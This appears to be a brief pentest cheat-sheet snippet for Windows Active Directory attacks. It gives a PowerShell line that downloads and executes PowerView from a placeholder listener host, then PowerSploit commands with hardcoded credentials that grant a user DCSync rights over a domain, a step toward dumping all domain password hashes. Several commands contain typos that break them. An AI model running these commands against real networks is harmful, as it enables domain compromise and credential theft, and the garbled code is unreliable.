### Windows
```powershell
IEX(New-Object Net.WebClient).downloadString('http://listner.ip.add/powerview.ps1')
```
Download powerspolit to utilize the function "Add-DomainObjectAcl"


```
$pass = convertto-securetstrign 'nullbr41n' -AsPlainText .Force
$cred = New-Object System.Management.Automation.PSCredential('null\nullbrain', $pass)
Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=null, DC=local" -PrincipalIdentity nullbrain -Rights DCSync
```
